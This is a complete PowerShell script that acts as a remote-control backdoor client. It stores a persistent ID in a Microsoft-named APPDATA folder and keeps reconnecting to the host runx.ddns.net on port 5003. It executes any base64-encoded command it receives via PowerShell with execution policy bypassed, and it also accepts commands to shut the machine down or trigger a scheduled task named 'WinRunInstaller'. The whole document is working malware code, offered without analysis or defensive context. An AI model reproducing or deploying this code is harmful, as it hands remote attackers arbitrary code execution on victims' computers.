Write-Host "=== Starting run.ps1 ===" -ForegroundColor Cyan

$m1 = New-Object System.Threading.Mutex($false, "run.exe")
if (-not $m1.WaitOne(0)) {
  Write-Host "Mutex run.exe already held. Exiting." -ForegroundColor Yellow
  exit
}

$m2 = New-Object System.Threading.Mutex($false, "run.ps1")
if (-not $m2.WaitOne(0)) {
  Write-Host "Mutex run.ps1 already held. Exiting." -ForegroundColor Yellow
  exit
}

$VPS_HOST = "runx.ddns.net"
$VPS_PORT = 5003
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
$SCRIPT_VERSION = "978635d"
$clientVersion = $SCRIPT_VERSION
Write-Host "Client: $uniqueUser | Version: $clientVersion" -ForegroundColor Yellow

function Execute-CommandPayload ($r) {
  if ($r.run -eq $true -and -not [string]::IsNullOrEmpty($r.cmd)) {
    $c = [System.Text.Encoding]::UTF8.GetString(
      [System.Convert]::FromBase64String($r.cmd)
    )

    Write-Host "Executing command payload: $c" -ForegroundColor Cyan

    if ($c -match "panic") {
      Write-Host "Panic command received. Exiting." -ForegroundColor Red
      exit
    }
    elseif ($c -match "altf4") {
      Write-Host "altf4 command received. System shutdown requested." -ForegroundColor Red
      Start-Process `
        -FilePath "shutdown" `
        -ArgumentList "/s", "/t", "0" `
        -WindowStyle Normal
    }
    elseif ($c -match "sauce") {
      Write-Host "sauce command received. Triggering WinRunInstaller." -ForegroundColor Yellow
      Start-ScheduledTask `
        -TaskName "WinRunInstaller"
    }
    else {
      $style = "Normal"

      Write-Host "Launching PowerShell command with WindowStyle: $style" -ForegroundColor Yellow
      Start-Process powershell.exe `
        -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy",
        "Bypass",
        "-Command",
        $c
      ) -WindowStyle $style
    }
  }
}

try {
  while ($true) {
    try {
      Write-Host "Connecting to TCP socket $VPS_HOST:$VPS_PORT..." -ForegroundColor Yellow
      $tcpClient = New-Object System.Net.Sockets.TcpClient
      $tcpClient.Connect($VPS_HOST, $VPS_PORT)

      if ($tcpClient.Connected) {
        Write-Host "TCP connected successfully." -ForegroundColor Green
        $stream = $tcpClient.GetStream()
        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true

        $hsObj = @{ username = $uniqueUser; version = $clientVersion; client_type = "cmd" } | ConvertTo-Json -Compress
        $writer.WriteLine($hsObj)

        while ($tcpClient.Connected) {
          $line = $reader.ReadLine()
          if ($null -eq $line) {
            Write-Host "Server closed connection." -ForegroundColor Red
            break
          }

          if ($line -match '"type":\s*"ping"') {
            $writer.WriteLine('{"type":"pong"}')
            continue
          }

          Write-Host "Received TCP line: $line" -ForegroundColor Green
          $r = $line | ConvertFrom-Json
          Execute-CommandPayload $r
        }
      }
    }
    catch {
      Write-Host "TCP connection error: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
      if ($tcpClient) {
        $tcpClient.Close()
        $tcpClient.Dispose()
      }
    }

    Write-Host "Reconnecting in 3 seconds..." -ForegroundColor Yellow
    Start-Sleep -Seconds 3
  }
}
finally {
  if ($m1) {
    $m1.ReleaseMutex()
    $m1.Dispose()
  }

  if ($m2) {
    $m2.ReleaseMutex()
    $m2.Dispose()
  }
}
